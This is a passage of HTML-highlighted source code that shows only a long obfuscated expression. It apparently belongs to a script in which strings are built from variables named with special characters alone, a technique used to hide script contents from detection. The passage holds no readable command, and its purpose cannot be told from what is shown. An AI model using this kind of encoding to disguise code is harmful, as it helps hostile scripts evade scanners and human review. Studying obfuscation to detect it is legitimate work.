class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">&amp;</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">(</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">&amp;</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">&amp;</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">&amp;</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">&amp;</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">&amp;</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}${</span><span class=\"p\">&amp;</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">.</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">]</span><span class=\"k\">}${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">.</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">|</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">&amp;</span><span class=\"k\">}${</span><span class=\"p\">)</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">[</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">=</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">[</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">)</span><span class=\"k\">}${</span><span class=\"p\">@</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">]</span><span class=\"k\">}</span><span class=\"s2\">+</span><span class=\"k\">${</span><span class=\"s2\">\"}</span><span class=\"k\">${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">+</span><span class=\"k\">}${</span><span class=\"p\">(</span><span class=\"k\">}</span><span 